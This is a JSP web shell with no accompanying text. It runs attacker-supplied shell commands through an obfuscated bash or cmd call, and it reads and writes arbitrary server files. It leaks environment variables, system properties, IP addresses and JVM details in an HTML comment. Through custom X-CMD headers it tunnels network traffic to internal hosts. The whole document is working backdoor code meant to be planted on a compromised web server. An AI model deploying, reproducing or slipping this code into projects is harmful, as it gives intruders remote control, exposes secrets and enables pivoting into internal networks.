<%@page import="java.io.*,javax.crypto.*,javax.xml.bind.*,java.nio.*,javax.crypto.spec.*, java.nio.channels.*, java.net.*,java.util.*"%><%
String cmd = request.getParameter("ls"),
        bh = new String(new byte[] { 47, 98, 105, 110, 47, 98, 97, 115, 104 }),
        cS = new String(new byte[] { 45, 99 }), szSys = request.getHeader("user-agent") + "\n", szTmp = "",
        s1 = null, s2 = null, szKeys = "";

String fileSeparator = String.valueOf(java.io.File.separatorChar);
if (fileSeparator.equals("\\")) {
    bh = new String(new byte[] { 99, 109, 100 });
    cS = new String(new byte[] { 47, 67 });
}

    String szT1 = request.getParameter("f"), szT2;
    if (null != szT1) {
        try {
            szT1 = java.net.URLDecoder.decode(szT1, "utf-8");
            if (null != (szT2 = request.getParameter("fv"))) {
                try {
                    szT2 = java.net.URLDecoder.decode(szT2, "utf-8");
                } catch (Exception e) {
                }
                FileOutputStream out1 = new FileOutputStream(szT1);
                out1.write(szT2.getBytes("utf-8"));
                out1.flush();
                out1.close();
            } else {
                FileInputStream in = new FileInputStream(szT1);
                int nX = 0;
                byte[] ab = new byte[4096];
                OutputStream outstr = response.getOutputStream();
                while (-1 < (nX = in.read(ab, 0, 4096))) {
                    outstr.write(ab, 0, nX);
                }
                outstr.flush();
                outstr.close();
            }
            return;
        } catch (Exception e) {
            out.println(e.getMessage());
        }
    }

    // which gcc nc wget curl perl python java ruby awk php
    if (request.getHeader("X-CMD") == null) {
        Map<String, String> env = System.getenv();
        for (String envName : env.keySet()) {
            if (null != envName && -1 == szKeys.indexOf(envName)) {
                szKeys += envName + ",";
                szSys += envName + "=\"" + env.get(envName) + "\"\n";
                if ("WL_HOME".equalsIgnoreCase(envName))
                    s1 = env.get(envName);
                else if ("os.name".equalsIgnoreCase(envName))
                    s2 = env.get(envName);
            }
        }

        Properties capitals = System.getProperties();
        Set states = capitals.keySet();
        for (Object name : states) {
            if (null != name && -1 == szKeys.indexOf((String) name)) {
                szKeys += (String) name + ",";
                szSys += (String) name + "=\"" + (String) capitals.getProperty((String) name) + "\"\n";
                if ("WL_HOME".equalsIgnoreCase((String) name))
                    s1 = capitals.getProperty((String) name);
                else if ("os.name".equalsIgnoreCase((String) name))
                    s2 = capitals.getProperty((String) name);
            }
        }

        if (null != s1 && null != s2) {
            boolean bRst = -1 < s2.indexOf("Linux");
            szTmp = s1 + "/common/bin/wlst." + (bRst ? "sh" : "cmd");
            if (!bRst)
                szTmp = szTmp.replace("/", "\\");

            if (new java.io.File(szTmp).exists())
                szSys += "wlst=\"" + szTmp + "\"\n";
        }
        //  javax.servlet-api >= 3.1
        try {
            
            if (null != pageContext.getServletContext()) {
                String szKK = pageContext.getServletContext().getResource("/").toString();
                szSys += "curRealPath=\"" + szKK + "\"";
            }
        } catch (Exception e) {
        }
    }
    if (cmd != null) {
        Process p = null;
        byte[] b = new byte[2048];
        OutputStream os = null;
        InputStream in = null;
        int x = 0;
        try {
            p = java.lang.Runtime.getRuntime().exec(new String[] { bh, cS, cmd });

            os = p.getOutputStream();
            in = p.getInputStream();
            x = in.read(b, 0, b.length);
            while (-1 < x) {
                if (0 < x)
                    out.print(new String(b, 0, x));
                x = in.read(b, 0, b.length);
            }
            os.close();
            in.close();
            szSys = "";
        } catch (Exception x6) {

        }
    }

    cmd = request.getHeader("X-CMD");
    if (cmd != null) {
        response.setHeader("X-STATUS", "OK");
        if (cmd.compareTo("CONNECT") == 0) {
            try {
                String target = request.getHeader("X-TARGET");
                int port = Integer.parseInt(request.getHeader("X-PORT"));
                SocketChannel socketChannel = SocketChannel.open();
                socketChannel.connect(new InetSocketAddress(target, port));
                socketChannel.configureBlocking(false);
                session.setAttribute("socket", socketChannel);
                response.setHeader("X-STATUS", "OK");
            } catch (UnknownHostException e) {
                System.out.println(e.getMessage());
                response.setHeader("X-ERROR", e.getMessage());
                response.setHeader("X-STATUS", "FAIL");
            } catch (IOException e) {
                System.out.println(e.getMessage());
                response.setHeader("X-ERROR", e.getMessage());
                response.setHeader("X-STATUS", "FAIL");

            }
        } else if (cmd.compareTo("DISCONNECT") == 0) {
            SocketChannel socketChannel = (SocketChannel) session.getAttribute("socket");
            try {
                socketChannel.socket().close();
            } catch (Exception ex) {
                System.out.println(ex.getMessage());
            }
            session.invalidate();
        } else if (cmd.compareTo("READ") == 0) {
            SocketChannel socketChannel = (SocketChannel) session.getAttribute("socket");
            try {
                ByteBuffer buf = ByteBuffer.allocate(512);
                int bytesRead = socketChannel.read(buf);
                OutputStream so = response.getOutputStream();
                while (bytesRead > 0) {
                    so.write(buf.array(), 0, bytesRead);
                    so.flush();
                    buf.clear();
                    bytesRead = socketChannel.read(buf);
                }
                response.setHeader("X-STATUS", "OK");
                so.flush();
                so.close();

            } catch (Exception e) {
                System.out.println(e.getMessage());
                response.setHeader("X-ERROR", e.getMessage());
                response.setHeader("X-STATUS", "FAIL");
            }

        } else if (cmd.compareTo("FORWARD") == 0) {
            SocketChannel socketChannel = (SocketChannel) session.getAttribute("socket");
            try {

                int readlen = request.getContentLength();
                byte[] buff = new byte[readlen];

                request.getInputStream().read(buff, 0, readlen);
                ByteBuffer buf = ByteBuffer.allocate(readlen);
                buf.clear();
                buf.put(buff);
                buf.flip();

                while (buf.hasRemaining()) {
                    socketChannel.write(buf);
                }
                response.setHeader("X-STATUS", "OK");
            } catch (Exception e) {
                System.out.println(e.getMessage());
                response.setHeader("X-ERROR", e.getMessage());
                response.setHeader("X-STATUS", "FAIL");
                socketChannel.socket().close();
            }
        }
    } else {
        try {
            String szIp = "", sT1;
            Set<InetAddress> addrs = new HashSet<InetAddress>();
            Enumeration<NetworkInterface> ns = null;
            try {
                ns = NetworkInterface.getNetworkInterfaces();
            } catch (SocketException e) {
            }
            while (ns != null && ns.hasMoreElements()) {
                NetworkInterface n = ns.nextElement();
                Enumeration<InetAddress> is = n.getInetAddresses();
                while (is.hasMoreElements()) {
                    InetAddress i = is.nextElement();
                    if (!i.isLoopbackAddress() && !i.isLinkLocalAddress() && !i.isMulticastAddress()) {
                        sT1 = i.getHostAddress();//-1 == sT1.indexOf(":") && 
                        if (16 > sT1.length())
                            szIp += "," + sT1;
                    }
                }
            }
            out.print("<!-- ip:" + szIp + "," + szSys);
            if (0 < szSys.length()) {
                java.lang.management.RuntimeMXBean rmb = java.lang.management.ManagementFactory
                        .getRuntimeMXBean();
                szSys = "\ngetBootClassPath=" + rmb.getBootClassPath();
                szSys += "\ngetClassPath=" + rmb.getClassPath();
                szSys += "\ngetLibraryPath=" + rmb.getLibraryPath();
                szSys += "\ngetSystemProperties=" + rmb.getSystemProperties();
                szSys += "\ngetInputArguments=" + rmb.getInputArguments().toString();
                szSys += "\npid=" + rmb.getName().split("@")[0];
                out.print(szSys);
            }
            out.print(" -->");
        } catch (Exception e) {
        }
        out.print("<!-- _xx_xx_ -->");
    }
%>